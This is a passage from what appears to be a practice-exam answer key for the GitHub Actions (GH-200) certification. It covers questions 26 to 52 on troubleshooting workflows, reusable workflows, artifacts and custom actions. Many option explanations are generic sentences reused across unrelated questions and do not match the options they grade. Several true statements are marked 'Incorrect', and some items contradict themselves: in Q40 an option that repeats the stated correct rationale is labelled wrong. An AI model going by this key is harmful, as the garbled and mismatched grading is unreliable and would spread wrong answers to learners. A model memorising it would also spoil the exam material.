- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. On `pull_request` events, GitHub checks out the simulated merge commit (`refs/pull/:num/merge`) rather than the raw PR head commit (`github.event.pull_request.head.sha`).
- **D:** Incorrect. GitHub Actions triggers span UTC `cron` schedules on the default branch, manual `workflow_dispatch`, Git/GitHub webhooks, and external REST `repository_dispatch` events.

### Question 27 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). Exit code `143` (`128 + SIGTERM 15`) indicates the Actions runner sent `SIGTERM` during graceful job cancellation/timeout (`waiting up to 7.5s–10s before sending SIGKILL / exit 137 if the process ignores SIGTERM`). [Skill 2.2: Enable and interpret step and runner diagnostic logs to identify failures | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging)]

- **A:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **D:** Correct. Step debug (`::debug::`) and runner debug logs isolate workflow logic errors from runner OOM (`137`) or command-not-found (`127`) failures.

### Question 28 — `A` (Consume and troubleshoot workflows)

Correct answer: A (is correct). No — checking `Enable debug logging` in the Re-run modal enables `ACTIONS_STEP_DEBUG` and `ACTIONS_RUNNER_DEBUG` transiently ONLY for that single re-run execution without persisting repository secrets or inflating future run logs. [Skill 2.2: Enable and interpret step and runner diagnostic logs to identify failures | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging)]

- **A:** Correct. Step debug (`::debug::`) and runner debug logs isolate workflow logic errors from runner OOM (`137`) or command-not-found (`127`) failures.
- **B:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **C:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 29 — `C, E` (Consume and troubleshoot workflows)

Correct answers: C and E (are correct). Select `Re-run failed jobs` (`rather than Re-run all jobs`) and check `Enable debug logging` (`setting transient ACTIONS_STEP_DEBUG and ACTIONS_RUNNER_DEBUG`) so only the 1 failed job and its skipped downstream dependents re-execute with full `##[debug]` traces. [Skill 2.2: Enable and interpret step and runner diagnostic logs to identify failures | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
- **C:** Correct. Selective failed-job reruns with debug logging capture verbose step and runner diagnostics without re-running passing matrix combinations.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **E:** Correct. Step debug (`::debug::`) and runner debug logs isolate workflow logic errors from runner OOM (`137`) or command-not-found (`127`) failures.
- **F:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 30 — `C` (Consume and troubleshoot workflows)

Correct answer: C (is correct). In YAML `<<:` mapping merges, keys explicitly present on the target mapping (`CFLAGS: "-O1 -fsanitize=address"`) ALWAYS take precedence over keys imported via `<<: *common_vars` regardless of whether `<<:` appears before or after the local key. [Skill 2.3: Interpret workflows that use YAML anchors and aliases during execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations#yaml-anchors-and-aliases)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. Each job executes on a fresh isolated runner environment, so cross-job transfer requires declared `jobs.<id>.outputs` strings or uploaded workflow artifacts.
- **C:** Correct. When expanding `<<: *defaults` in a YAML mapping, keys explicitly written in the child mapping take precedence over keys inherited from `*defaults`.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 31 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). The YAML merge key `<<:` operates ONLY on YAML mappings (`key: value` dictionaries like `env:` or `with:`), NOT on sequences (`lists like steps:`); reusing multi-step sequences cleanly in GitHub Actions requires a Composite action (`or reusable workflow`). [Skill 2.3: Interpret workflows that use YAML anchors and aliases during execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations#yaml-anchors-and-aliases)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **C:** Incorrect. Reusable workflows execute under the caller repository `GITHUB_TOKEN`/context, support up to 4 nesting levels, and accept explicit `with:` inputs and `secrets:`.
- **D:** Correct. When expanding `<<: *defaults` in a YAML mapping, keys explicitly written in the child mapping take precedence over keys inherited from `*defaults`.

### Question 32 — `C` (Consume and troubleshoot workflows)

Correct answer: C (is correct). GitHub Actions permits re-running workflow jobs (`Re-run all jobs`, `Re-run failed jobs`, or single-job re-runs) for at most `30 days` after the initial workflow run was created (`and also blocks re-runs once logs/artifacts have expired`). [Skill 2.4: Analyze matrix-driven runs and re-run failed or targeted jobs | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs)]

- **A:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **B:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **C:** Correct. GitHub Actions supports re-running all jobs, **only failed jobs** (and their downstream dependents), or **one specific job** up to 30 days after initial run creation.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 33 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). Mapping the failed run-graph node to `(riscv64, ubuntu-24.04)`, checking step logs for the first non-zero exit / `::error::`, running `Re-run failed jobs` with `Enable debug logging`, and verifying the committed fix resolves matrix regressions cleanly. [Skill 2.4: Analyze matrix-driven runs and re-run failed or targeted jobs | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs)]

- **A:** Incorrect. Deleting workflows erases run history, printing secrets violates security rules, and re-running green matrix legs wastes billable minutes.
- **B:** Correct. Selective `Re-run failed jobs` with `Enable debug logging` (`ACTIONS_STEP_DEBUG` / `ACTIONS_RUNNER_DEBUG`) isolates failures without re-billing green legs.
- **C:** Incorrect. Suppressing exit codes with `|| true` hides real regressions rather than diagnosing the failing matrix variant.
- **D:** Incorrect. Standard GitHub-hosted runners do not expose inbound port 22 SSH, and permanent org-wide debug logging bloats log storage.

### Question 34 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). Passing `--json databaseId,headSha,conclusion` (`optionally paired with --jq`) to `gh run list` outputs machine-readable JSON directly from GitHub's Actions Runs API for automated scripting and triage. [Skill 2.5: Locate workflow runs and logs via the GitHub UI, CLI, and REST API | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/rest/actions/workflow-runs)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Correct. Both the GitHub CLI (`gh run`) and Actions Workflow Runs REST API expose run metadata, timing, check suites, and downloadable log archives.
- **C:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **D:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.

### Question 35 — `A, C` (Consume and troubleshoot workflows)

Correct answers: A and C (are correct). `GET /repos/{owner}/{repo}/actions/jobs/{job_id}/logs` (`with actions: read`) redirects to the plain-text log file for that specific job, and `gh run watch <run-id> --exit-status` streams live job progress in the terminal and exits non-zero if the run fails. [Skill 2.5: Locate workflow runs and logs via the GitHub UI, CLI, and REST API | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/rest/actions/workflow-runs)]

- **A:** Correct. Both the GitHub CLI (`gh run`) and Actions Workflow Runs REST API expose run metadata, timing, check suites, and downloadable log archives.
- **B:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
- **C:** Correct. In `upload-artifact@v4`, artifacts are immutable once uploaded—matrix jobs must include `${{ matrix.* }}` in `name:` and merge via `pattern:` on download.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **E:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **F:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 36 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). In `actions/download-artifact@v4`, pairing `pattern: 'elf-*'` with `merge-multiple: true` downloads all matching artifacts from the run and merges their files directly into target `path:` (`instead of nesting each artifact in its own subfolder`). [Skill 2.6: Access and download workflow artifacts from completed runs | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/downloading-workflow-artifacts)]

- **A:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **D:** Correct. In `upload-artifact@v4`, artifacts are immutable once uploaded—matrix jobs must include `${{ matrix.* }}` in `name:` and merge via `pattern:` on download.

### Question 37 — `A` (Consume and troubleshoot workflows)

Correct answer: A (is correct). The GitHub REST API (`/actions/artifacts/{artifact_id}/zip`, requiring `actions: read`) always serves a `.zip` archive via a 1-minute signed `302` redirect URL (`just like browser UI downloads`), whereas `actions/download-artifact@v4` automatically extracts files onto the runner disk. [Skill 2.6: Access and download workflow artifacts from completed runs | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/downloading-workflow-artifacts)]

- **A:** Correct. In `upload-artifact@v4`, artifacts are immutable once uploaded—matrix jobs must include `${{ matrix.* }}` in `name:` and merge via `pattern:` on download.
- **B:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **C:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **D:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.

### Question 38 — `A` (Consume and troubleshoot workflows)

Correct answer: A (is correct). Caller `env:` variables defined in the calling workflow are NOT implicitly propagated into a `workflow_call` reusable workflow; pass configuration explicitly via declared `on.workflow_call.inputs` (`with:`) or organization/repository `vars.*`. [Skill 2.7: Consume organization-level reusable workflows in downstream repositories | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/reusing-workflows)]

- **A:** Correct. Reusable workflows execute under the caller repository `GITHUB_TOKEN`/context, support up to 4 nesting levels, and accept explicit `with:` inputs and `secrets:`.
- **B:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 39 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). Reusable workflows can only maintain or REDUCE `GITHUB_TOKEN` permissions relative to caller boundaries; setting `permissions: { contents: read, security-events: write }` on the caller's `jobs.<callee_id>` (`or inside the callee`) scopes down the token for that reusable call. [Skill 2.7: Consume organization-level reusable workflows in downstream repositories | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Correct. Reusable workflows execute under the caller repository `GITHUB_TOKEN`/context, support up to 4 nesting levels, and accept explicit `with:` inputs and `secrets:`.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 40 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). No — starter workflow templates copy a static `.yml` file into a repository once at creation time and have zero runtime link afterward; updating 65 repos centrally requires those repos to invoke a `workflow_call` Reusable Workflow instead. [Skill 2.8: Use public and non-public starter workflow templates across repositories | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-workflow-templates)]

- **A:** Incorrect. Reusable workflows execute under the caller repository `GITHUB_TOKEN`/context, support up to 4 nesting levels, and accept explicit `with:` inputs and `secrets:`.
- **B:** Correct. Starter templates only scaffold initial file creation; centrally updating CI logic across 100 repos requires a Reusable Workflow (`on: workflow_call`) or Required Workflow.
- **C:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — starter workflow templates copy a static `.yml` file into a repository once at creation time and have zero runtime link afterward; updating 65 repos centrally requires those repos to invoke a `workflow_call` Reusable Workflow instead.
- **D:** Incorrect. Starter workflows copy a static `.yml` into a repo once (`edits to the template never propagate`), unlike centrally versioned Reusable workflows or Composite actions.

### Question 41 — `B, F` (Consume and troubleshoot workflows)

Correct answers: B and F (are correct). Use template variable `$default-branch` (`and optional $protected-branches`) inside `rust-service.yml` so GitHub substitutes each target repo's actual default branch on creation, and set `"filePatterns": ["^Cargo\\.toml$"]` (`plus name, description, iconName`) inside `rust-service.properties.json`. [Skill 2.8: Use public and non-public starter workflow templates across repositories | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-workflow-templates)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Correct. Starter workflows copy a static `.yml` into a repo once (`edits to the template never propagate`), unlike centrally versioned Reusable workflows or Composite actions.
- **C:** Incorrect. Starter templates only scaffold initial file creation; centrally updating CI logic across 100 repos requires a Reusable Workflow (`on: workflow_call`) or Required Workflow.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **E:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **F:** Correct. Starter templates bootstrap new repos as independent copies, whereas `workflow_call` reusable workflows centralize ongoing maintenance in one versioned file.

### Question 42 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). Disabling (`gh workflow disable`) pauses triggers while preserving runs and keeping the file on `main`, whereas after deleting `.github/workflows/<file>.yml` from `main`, deleting its remaining historical workflow runs (`UI / DELETE /repos/{owner}/{repo}/actions/runs/{run_id}`) clears the sidebar entry. [Skill 2.9: Manage workflow lifecycle states including disabling, enabling, and deleting workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/disabling-and-enabling-a-workflow)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Correct. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.

### Question 43 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). No — a manually disabled workflow ignores all automated webhook (`push`, `pull_request`), `schedule`, and `workflow_dispatch` triggers until a user with write permissions explicitly re-enables it (`Enable workflow` or `gh workflow enable`). [Skill 2.9: Manage workflow lifecycle states including disabling, enabling, and deleting workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/disabling-and-enabling-a-workflow)]

- **A:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
- **B:** Correct. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **C:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **D:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.

### Question 44 — `C` (Author and maintain actions)

Correct answer: C (is correct). `github.getOctokit(token)` from `@actions/github` returns a pre-configured Octokit REST and GraphQL client (`honoring GHES/GHEC GITHUB_API_URL and proxy env vars`), while `github.context` exposes parsed `$GITHUB_EVENT_PATH` payload metadata. [Skill 3.1: Create and configure JavaScript actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-javascript-action)]

- **A:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **B:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **C:** Correct. JavaScript actions run directly on Linux, Windows, and macOS host runners with sub-second startup (`no Docker image pull/build overhead`) and support `pre:`/`post:` cleanup.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 45 — `B` (Author and maintain actions)

Correct answer: B (is correct). JavaScript actions support `runs.pre-if` (`and runs.post-if`, defaulting to `'always()'`) evaluated against workflow contexts such as `pre-if: runner.os == 'Linux'`. [Skill 3.1: Create and configure JavaScript actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-javascript-action)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Correct. JavaScript actions run directly on Linux, Windows, and macOS host runners with sub-second startup (`no Docker image pull/build overhead`) and support `pre:`/`post:` cleanup.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 46 — `A` (Author and maintain actions)

Correct answer: A (is correct). Writing `action.yml` (`using: "node20"`, `main: "dist/index.js"`), coding with `@actions/core` & `core.setFailed()`, bundling `dist/index.js` via `@vercel/ncc` and committing `dist/`, and tagging `v1.0.0` + `v1` + 40-char SHA ensures reliable zero-install execution. [Skill 3.1: Create and configure JavaScript actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-javascript-action)]

- **A:** Correct. Bundling `node20` JavaScript actions into committed `dist/index.js` gives sub-second cross-OS execution with zero consumer `npm install` step.
- **B:** Incorrect. Bundled `dist/index.js` + `action.yml` runs standalone with zero pre-install steps in caller workflows.
- **C:** Incorrect. Omitting both `dist/` and `node_modules/` crashes immediately with `Cannot find module`, `node12` is retired, and `@main` is unsafe.
- **D:** Incorrect. Docker actions fail on macOS and Windows runners; cross-OS custom actions require JavaScript (`node20`) or Composite actions.

### Question 47 — `D` (Author and maintain actions)

Correct answer: D (is correct). A Docker container action bundles exact Linux OS packages and system libraries cleanly, and GitHub Actions automatically mounts `$GITHUB_WORKSPACE` (`typically /github/workspace`) as the container's working directory during execution. [Skill 3.2: Create and configure Docker container and composite actions, and select the appropriate action type | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-docker-container-action)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **C:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **D:** Correct. Docker actions guarantee exact Linux OS dependencies (`Linux-only, slower image startup`), whereas Composite actions chain cross-OS `run:` (`shell:` required) and `uses:` steps.

### Question 48 — `B` (Author and maintain actions)

Correct answer: B (is correct). No — Docker container actions (`runs.using: 'docker'`) execute exclusively on Linux runners with Docker installed and fail on macOS and Windows jobs; use a JavaScript (`node20`) or Composite (`composite`) action for cross-OS compatibility. [Skill 3.2: Create and configure Docker container and composite actions, and select the appropriate action type | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-docker-container-action)]

- **A:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — Docker container actions (`runs.using: 'docker'`) execute exclusively on Linux runners with Docker installed and fail on macOS and Windows jobs; use a JavaScript (`node20`) or Composite (`composite`) action for cross-OS compatibility.
- **B:** Correct. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **C:** Incorrect. JavaScript actions run directly on Linux, Windows, and macOS host runners with sub-second startup (`no Docker image pull/build overhead`) and support `pre:`/`post:` cleanup.
- **D:** Incorrect. Docker actions guarantee exact Linux OS dependencies (`Linux-only, slower image startup`), whereas Composite actions chain cross-OS `run:` (`shell:` required) and `uses:` steps.

### Question 49 — `B, D` (Author and maintain actions)

Correct answers: B and D (are correct). Every `run:` step inside `runs.steps:` MUST declare `shell:` explicitly (`e.g., shell: bash`), and `outputs.report-json` at top level must pair with `runs: outputs: report-json: { description: '...', value: ${{ steps.scan.outputs.json }} }` to bubble the inner step output out. [Skill 3.2: Create and configure Docker container and composite actions, and select the appropriate action type | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-docker-container-action)]

- **A:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **B:** Correct. Docker actions guarantee exact Linux OS dependencies (`Linux-only, slower image startup`), whereas Composite actions chain cross-OS `run:` (`shell:` required) and `uses:` steps.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Correct. Composite actions require explicit `shell:` on every `run:` step and locate files inside the action repo via `github.action_path`.
- **E:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **F:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.

### Question 50 — `C` (Author and maintain actions)

Correct answer: C (is correct). Immutable Actions distribute versioned action bundles as OCI artifacts via `pkg.actions.githubusercontent.com` and GitHub Container Registry (`ghcr.io`), so self-hosted runner firewalls must allow HTTPS (`443`) to `*.actions.githubusercontent.com` and `ghcr.io` alongside `github.com`. [Skill 3.3: Troubleshoot action failures and adopt immutable action distribution practices | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/about-custom-actions)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. Immutable Actions package releases into immutable OCI artifacts so published versions cannot be silently overwritten, while `core.setFailed()` logs an `::error::` annotation and sets exit code `1`.
- **D:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!

### Question 51 — `C` (Author and maintain actions)

Correct answer: C (is correct). GitHub Actions passes resolved `runs.args` as command-line arguments appended to the container's `ENTRYPOINT` (`overriding Dockerfile CMD`), so `entrypoint.sh` must start with a valid `#!/bin/sh -e` shebang and read `"$@"` (`$1`, `$2`, ...). [Skill 3.3: Troubleshoot action failures and adopt immutable action distribution practices | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/about-custom-actions)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **C:** Correct. Immutable Actions package releases into immutable OCI artifacts so published versions cannot be silently overwritten, while `core.setFailed()` logs an `::error::` annotation and sets exit code `1`.
- **D:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.

### Question 52 — `D` (Author and maintain actions)

Correct answer: D (is correct). Adding `deprecationMessage: 'Use github-token instead; old-token will be removed in v2'` under `inputs.old-token` in `action.yml` logs an automatic warning message whenever a caller workflow supplies that deprecated input. [Skill 3.4: Define action metadata, inputs, outputs, and branding in action configuration files | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions)]

- **A:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
